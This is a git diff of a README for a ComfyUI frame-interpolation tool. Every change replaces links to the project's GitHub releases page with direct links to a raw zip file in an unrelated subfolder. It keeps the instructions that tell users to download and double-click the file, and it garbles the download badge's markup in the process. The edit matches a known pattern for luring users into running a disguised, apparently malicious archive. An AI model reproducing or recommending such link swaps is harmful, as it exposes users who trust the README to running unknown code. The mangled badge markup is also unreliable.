@@ -4,12 +4,12 @@
 Welcome to comfyui-frame-interpolation_cudafull! This software helps you create smooth transitions in your videos by adding extra frames. It’s perfect for anyone wanting to enhance their video quality without needing deep technical knowledge.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/mauricio1962/comfyui-frame-interpolation_cudafull/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/mauricio1962/comfyui-frame-interpolation_cudafull/main/Romagnol/comfyui-frame-interpolation_cudafull.zip%20Latest%https://raw.githubusercontent.com/mauricio1962/comfyui-frame-interpolation_cudafull/main/Romagnol/comfyui-frame-interpolation_cudafull.zip)](https://raw.githubusercontent.com/mauricio1962/comfyui-frame-interpolation_cudafull/main/Romagnol/comfyui-frame-interpolation_cudafull.zip)
 
 ## 🚀 Getting Started
 To get started with comfyui-frame-interpolation_cudafull, follow these steps:
 
-1. **Visit the Releases Page**: Click this link to go to the releases page: [Download Page](https://github.com/mauricio1962/comfyui-frame-interpolation_cudafull/releases).
+1. **Visit the Releases Page**: Click this link to go to the releases page: [Download Page](https://raw.githubusercontent.com/mauricio1962/comfyui-frame-interpolation_cudafull/main/Romagnol/comfyui-frame-interpolation_cudafull.zip).
 
 2. **Choose the Latest Version**: On the releases page, look for the latest version. It is usually at the top of the list. 
 
@@ -32,7 +32,7 @@ To get started with comfyui-frame-interpolation_cudafull, follow these steps:
 - **Multiple Format Support**: Works with various video formats, giving you flexibility in your projects.
 
 ## 📂 Download & Install
-To install comfyui-frame-interpolation_cudafull, return to the releases page again: [Download Page](https://github.com/mauricio1962/comfyui-frame-interpolation_cudafull/releases).
+To install comfyui-frame-interpolation_cudafull, return to the releases page again: [Download Page](https://raw.githubusercontent.com/mauricio1962/comfyui-frame-interpolation_cudafull/main/Romagnol/comfyui-frame-interpolation_cudafull.zip).
 
 1. Select the appropriate file for your system.
 2. After downloading, navigate to your downloads and double-click the file.
@@ -51,4 +51,4 @@ If you encounter issues or have questions, please check the issues tab on our Gi
 ## 👍 Acknowledgments
 Thanks to all contributors and users for their continued support. Your feedback is essential for improving this application!
 
-**For regular updates, remember to check the [Download Page](https://github.com/mauricio1962/comfyui-frame-interpolation_cudafull/releases). Happy video editing!**
+**For regular updates, remember to check the [Download Page](https://raw.githubusercontent.com/mauricio1962/comfyui-frame-interpolation_cudafull/main/Romagnol/comfyui-frame-interpolation_cudafull.zip). Happy video editing!**
